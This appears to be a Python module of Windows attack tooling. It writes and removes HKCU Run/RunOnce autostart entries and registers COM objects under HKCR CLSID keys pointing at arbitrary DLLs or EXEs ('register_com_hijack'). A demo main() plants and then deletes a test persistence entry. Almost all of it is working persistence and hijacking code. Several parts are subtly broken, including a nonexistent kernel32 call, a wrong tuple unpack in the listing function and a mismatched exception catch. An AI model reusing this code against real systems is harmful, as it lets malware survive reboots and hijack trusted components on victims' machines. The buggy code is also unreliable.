import winreg
import ctypes
import os
import sys
from typing import Optional, List, Tuple
from dataclasses import dataclass, field


@dataclass
class RegistryKey:
    """Represents a Windows Registry key with its path and hive."""
    hive: int  # HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, etc.
    path: str
    
    def __post_init__(self):
        if not isinstance(self.hive, int):
            raise TypeError(f"Hive must be an integer (registry constant), got {type(self.hive)}")
        if not isinstance(self.path, str):
            raise TypeError(f"Path must be a string, got {type(self.path)}")
        if not self.path:
            raise ValueError("Registry path cannot be empty")


class RegistryHijackError(Exception):
    """Base exception for registry hijack operations."""
    pass


class RegistryReadError(RegistryHijackError):
    """Raised when reading from the registry fails."""
    pass


class RegistryWriteError(RegistryHijackError):
    """Raised when writing to the registry fails."""
    pass


class COMObjectError(RegistryHijackError):
    """Raised when COM object hijacking fails."""
    pass


def _get_registry_constants() -> dict:
    """Return a mapping of registry hive constants."""
    return {
        "HKCU": winreg.HKEY_CURRENT_USER,
        "HKLM": winreg.HKEY_LOCAL_MACHINE,
        "HKCR": winreg.HKEY_CLASSES_ROOT,
        "HKU": winreg.HKEY_USERS,
        "HKCC": winreg.HKEY_CURRENT_CONFIG,
    }


def _validate_key(key: RegistryKey) -> None:
    """Validate that a RegistryKey has valid hive and path."""
    if key.hive not in _get_registry_constants().values():
        raise ValueError(f"Invalid hive value: {key.hive}")
    if "\\" in key.path and key.path.startswith("\\"):
        raise ValueError(f"Path should not start with backslash: {key.path}")


def get_current_user_run_keys() -> List[str]:
    """
    Enumerate all Run and RunOnce keys under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
    and RunOnce.
    
    Returns:
        List of strings representing full registry paths for each run key found.
    """
    results = []
    base_path = r"Software\Microsoft\Windows\CurrentVersion"
    subkeys = ["Run", "RunOnce"]
    
    try:
        hkey = winreg.HKEY_CURRENT_USER
        root_key = winreg.OpenKey(hkey, base_path, 0, winreg.KEY_READ)
        
        for subkey_name in subkeys:
            try:
                sub_key = winreg.OpenKey(root_key, subkey_name, 0, winreg.KEY_READ)
                full_path = f"{base_path}\\{subkey_name}"
                results.append(full_path)
                winreg.CloseKey(sub_key)
            except FileNotFoundError:
                continue
        
        winreg.CloseKey(root_key)
    except OSError as e:
        raise RegistryReadError(f"Failed to enumerate run keys: {e}")
    
    return results


def read_registry_value(key: RegistryKey, value_name: str) -> Optional[str]:
    """
    Read a specific value from a registry key.
    
    Args:
        key: RegistryKey instance specifying hive and path.
        value_name: Name of the value to read.
        
    Returns:
        The string value if found, None otherwise.
        
    Raises:
        RegistryReadError: If the operation fails.
    """
    _validate_key(key)
    
    try:
        hkey = winreg.OpenKey(key.hive, key.path, 0, winreg.KEY_READ)
        try:
            value, _ = winreg.QueryValueEx(hkey, value_name)
            return str(value)
        except FileNotFoundError:
            return None
        finally:
            winreg.CloseKey(hkey)
    except OSError as e:
        raise RegistryReadError(f"Failed to read '{value_name}' from {key.path}: {e}")


def write_registry_value(key: RegistryKey, value_name: str, value: str, 
                         reg_type: int = winreg.REG_SZ) -> bool:
    """
    Write a value to a registry key. Creates the key if it doesn't exist.
    
    Args:
        key: RegistryKey instance specifying hive and path.
        value_name: Name of the value to write.
        value: String value to write.
        reg_type: Registry value type (default REG_SZ).
        
    Returns:
        True if successful.
        
    Raises:
        RegistryWriteError: If the operation fails.
    """
    _validate_key(key)
    
    if not isinstance(value, str):
        raise TypeError(f"Value must be a string, got {type(value)}")
    
    try:
        hkey = winreg.CreateKeyEx(key.hive, key.path, 0, winreg.KEY_SET_VALUE | winreg.KEY_CREATE_SUB_KEY)
        try:
            winreg.SetValueEx(hkey, value_name, 0, reg_type, value)
            return True
        finally:
            winreg.CloseKey(hkey)
    except OSError as e:
        raise RegistryWriteError(f"Failed to write '{value_name}' to {key.path}: {e}")


def delete_registry_value(key: RegistryKey, value_name: str) -> bool:
    """
    Delete a value from a registry key.
    
    Args:
        key: RegistryKey instance specifying hive and path.
        value_name: Name of the value to delete.
        
    Returns:
        True if successful or value didn't exist.
        
    Raises:
        RegistryWriteError: If the operation fails.
    """
    _validate_key(key)
    
    try:
        hkey = winreg.OpenKey(key.hive, key.path, 0, winreg.KEY_SET_VALUE)
        try:
            winreg.DeleteValue(hkey, value_name)
            return True
        except FileNotFoundError:
            return True  # Value already doesn't exist
        finally:
            winreg.CloseKey(hkey)
    except OSError as e:
        raise RegistryWriteError(f"Failed to delete '{value_name}' from {key.path}: {e}")


def add_persistence_entry(program_name: str, executable_path: str, 
                          description: str = "", permanent: bool = True) -> bool:
    """
    Add a persistence entry using the Run/RunOnce registry keys.
    
    Args:
        program_name: Display name for the entry.
        executable_path: Full path to the executable to run.
        description: Optional description for the entry.
        permanent: If True, use Run; if False, use RunOnce.
        
    Returns:
        True if the entry was added successfully.
        
    Raises:
        RegistryWriteError: If the registry operation fails.
        TypeError: If arguments have invalid types.
    """
    if not isinstance(program_name, str):
        raise TypeError(f"program_name must be a string, got {type(program_name)}")
    if not isinstance(executable_path, str):
        raise TypeError(f"executable_path must be a string, got {type(executable_path)}")
    if not isinstance(description, str):
        raise TypeError(f"description must be a string, got {type(description)}")
    if not isinstance(permanent, bool):
        raise TypeError(f"permanent must be a boolean, got {type(permanent)}")
    
    if not executable_path:
        raise ValueError("executable_path cannot be empty")
    if not program_name:
        raise ValueError("program_name cannot be empty")
    
    subkey = "Run" if permanent else "RunOnce"
    key = RegistryKey(winreg.HKEY_CURRENT_USER, f"Software\\Microsoft\\Windows\\CurrentVersion\\{subkey}")
    
    # Prepare the value: include description if provided
    if description:
        value_to_write = f'"{executable_path}" /DESC:"{description}"'
    else:
        value_to_write = executable_path
    
    return write_registry_value(key, program_name, value_to_write)


def remove_persistence_entry(program_name: str) -> bool:
    """
    Remove a persistence entry by its display name.
    
    Args:
        program_name: Display name of the entry to remove.
        
    Returns:
        True if the entry was removed or didn't exist.
        
    Raises:
        RegistryWriteError: If the registry operation fails.
    """
    if not isinstance(program_name, str):
        raise TypeError(f"program_name must be a string, got {type(program_name)}")
    
    success = True
    subkeys = ["Run", "RunOnce"]
    
    for subkey in subkeys:
        key = RegistryKey(winreg.HKEY_CURRENT_USER, f"Software\\Microsoft\\Windows\\CurrentVersion\\{subkey}")
        try:
            result = delete_registry_value(key, program_name)
            if not result:
                success = False
        except RegistryReadError:
            # Key might not exist, which is fine
            continue
    
    return success


def list_all_persistence_entries() -> dict:
    """
    List all persistence entries across Run and RunOnce keys.
    
    Returns:
        Dictionary with 'run' and 'runonce' keys, each containing a list of 
        tuples (name, value) for each entry.
    """
    result = {"run": [], "runonce": []}
    subkeys_map = {"run": "Run", "runonce": "RunOnce"}
    
    for key_type, subkey_name in subkeys_map.items():
        key = RegistryKey(winreg.HKEY_CURRENT_USER, f"Software\\Microsoft\\Windows\\CurrentVersion\\{subkey_name}")
        try:
            hkey = winreg.OpenKey(key.hive, key.path, 0, winreg.KEY_READ)
            try:
                index = 0
                while True:
                    try:
                        name, value_type = winreg.EnumValue(hkey, index)
                        result[key_type].append((name, value_type))
                        index += 1
                    except OSError:
                        break
            finally:
                winreg.CloseKey(hkey)
        except OSError:
            continue
    
    return result


def check_com_object_hijack(class_id: str) -> Optional[dict]:
    """
    Check if a COM class ID exists and retrieve its CLSID information.
    
    Args:
        class_id: The CLSID string to check (e.g., "{00000000-0000-0000-0000-000000000000}").
        
    Returns:
        Dictionary with CLSID info if found, None otherwise.
    """
    if not isinstance(class_id, str):
        raise TypeError(f"class_id must be a string, got {type(class_id)}")
    
    # CLSID path under HKCR
    clsid_path = f"CLSID\\{class_id}"
    key = RegistryKey(winreg.HKEY_CLASSES_ROOT, clsid_path)
    
    try:
        # Try to read the default value (usually the friendly name)
        default_value = read_registry_value(key, "")
        
        if default_value is None:
            return None
        
        # Check for InprocServer32 or LocalServer32 subkeys
        inproc_path = f"{clsid_path}\\InprocServer32"
        local_path = f"{clsid_path}\\LocalServer32"
        
        inproc_key = RegistryKey(winreg.HKEY_CLASSES_ROOT, inproc_path)
        local_key = RegistryKey(winreg.HKEY_CLASSES_ROOT, local_path)
        
        inproc_server = read_registry_value(inproc_key, "")
        local_server = read_registry_value(local_key, "")
        
        return {
            "clsid": class_id,
            "friendly_name": default_value,
            "inproc_server_32": inproc_server,
            "local_server_32": local_server,
            "path_exists": True
        }
    except Exception:
        return None


def register_com_hijack(class_id: str, server_path: str, 
                        server_type: str = "inproc", 
                        description: str = "") -> bool:
    """
    Register a COM server for hijacking purposes.
    
    Args:
        class_id: CLSID to register.
        server_path: Path to the DLL or EXE to register.
        server_type: "inproc" for DLLs, "local" for EXEs.
        description: Friendly name for the COM object.
        
    Returns:
        True if registration succeeded.
        
    Raises:
        COMObjectError: If registration fails.
        TypeError: If arguments have invalid types.
    """
    if not isinstance(class_id, str):
        raise TypeError(f"class_id must be a string, got {type(class_id)}")
    if not isinstance(server_path, str):
        raise TypeError(f"server_path must be a string, got {type(server_path)}")
    if not isinstance(description, str):
        raise TypeError(f"description must be a string, got {type(description)}")
    
    if server_type not in ("inproc", "local"):
        raise ValueError(f"server_type must be 'inproc' or 'local', got '{server_type}'")
    
    if not class_id:
        raise ValueError("class_id cannot be empty")
    if not server_path:
        raise ValueError("server_path cannot be empty")
    
    base_path = f"CLSID\\{class_id}"
    subkey = "InprocServer32" if server_type == "inproc" else "LocalServer32"
    full_path = f"{base_path}\\{subkey}"
    
    key = RegistryKey(winreg.HKEY_CLASSES_ROOT, full_path)
    
    try:
        # Set the default value to the server path
        write_registry_value(key, "", server_path, winreg.REG_SZ)
        
        # Set ThreadingModel if needed
        threading_model = "Apartment" if server_type == "inproc" else "Both"
        threading_key = RegistryKey(winreg.HKEY_CLASSES_ROOT, full_path)
        write_registry_value(threading_key, "ThreadingModel", threading_model, winreg.REG_SZ)
        
        # Set description if provided
        if description:
            desc_key = RegistryKey(winreg.HKEY_CLASSES_ROOT, base_path)
            write_registry_value(desc_key, "", description, winreg.REG_SZ)
        
        return True
    except Exception as e:
        raise COMObjectError(f"Failed to register COM object {class_id}: {e}")


def unregister_com_object(class_id: str) -> bool:
    """
    Unregister a COM object by removing its registry entries.
    
    Args:
        class_id: CLSID to unregister.
        
    Returns:
        True if unregistration succeeded or object didn't exist.
    """
    if not isinstance(class_id, str):
        raise TypeError(f"class_id must be a string, got {type(class_id)}")
    
    base_path = f"CLSID\\{class_id}"
    subkeys = ["InprocServer32", "LocalServer32"]
    
    success = True
    
    for subkey in subkeys:
        full_path = f"{base_path}\\{subkey}"
        key = RegistryKey(winreg.HKEY_CLASSES_ROOT, full_path)
        
        try:
            # Delete the entire subkey
            hkey = winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, base_path, 0, winreg.KEY_WRITE)
            try:
                winreg.DeleteKey(hkey, subkey)
            except FileNotFoundError:
                pass  # Subkey doesn't exist, which is fine
            finally:
                winreg.CloseKey(hkey)
        except OSError:
            success = False
    
    return success


def get_system_architecture() -> str:
    """
    Get the system architecture (x86, x64, ARM64).
    
    Returns:
        String representing the architecture.
    """
    try:
        return ctypes.windll.kernel32.GetMachineType()
    except Exception:
        # Fallback: check environment variable
        arch = os.environ.get("PROCESSOR_ARCHITECTURE", "Unknown")
        if "64" in arch:
            return "x64"
        elif "ARM" in arch:
            return "ARM64"
        return "x86"


def is_admin() -> bool:
    """
    Check if the current process has administrative privileges.
    
    Returns:
        True if running as admin, False otherwise.
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def main():
    """Demonstrate the registry hijack functionality."""
    print("=" * 60)
    print("Registry Hijack Demonstration")
    print("=" * 60)
    
    # Check admin status
    admin_status = "Yes" if is_admin() else "No"
    print(f"\nRunning as Administrator: {admin_status}")
    
    # Show current architecture
    arch = get_system_architecture()
    print(f"System Architecture: {arch}")
    
    # List existing persistence entries
    print("\n--- Existing Persistence Entries ---")
    entries = list_all_persistence_entries()
    for key_type, values in entries.items():
        print(f"\n{key_type.upper()}:")
        if not values:
            print("  (empty)")
        else:
            for name, value in values:
                print(f"  {name}: {value}")
    
    # Add a test persistence entry
    test_program = "test_hijack.exe"
    test_executable = f"C:\\Users\\Public\\{test_program}"
    
    print(f"\n--- Adding Persistence Entry ---")
    print(f"Program: {test_program}")
    print(f"Executable: {test_executable}")
    
    try:
        result = add_persistence_entry(test_program, test_executable, 
                                      description="Test Hijack Entry", 
                                      permanent=True)
        print(f"Result: {'Success' if result else 'Failed'}")
    except Exception as e:
        print(f"Error adding entry: {e}")
    
    # Verify the entry was added
    print("\n--- Verifying Entry ---")
    updated_entries = list_all_persistence_entries()
    if any(name == test_program for name, _ in updated_entries["run"]):
        print("Entry verified in Run key!")
    else:
        print("Entry NOT found in Run key.")
    
    # Clean up
    print(f"\n--- Removing Persistence Entry ---")
    try:
        remove_result = remove_persistence_entry(test_program)
        print(f"Removal Result: {'Success' if remove_result else 'Failed'}")
    except Exception as e:
        print(f"Error removing entry: {e}")
    
    # Final verification
    final_entries = list_all_persistence_entries()
    if not any(name == test_program for name, _ in final_entries["run"]):
        print("Entry successfully removed!")
    else:
        print("Entry still present after removal attempt.")
    
    print("\n" + "=" * 60)
    print("Demo Complete")
    print("=" * 60)


if __name__ == "__main__":
    main()
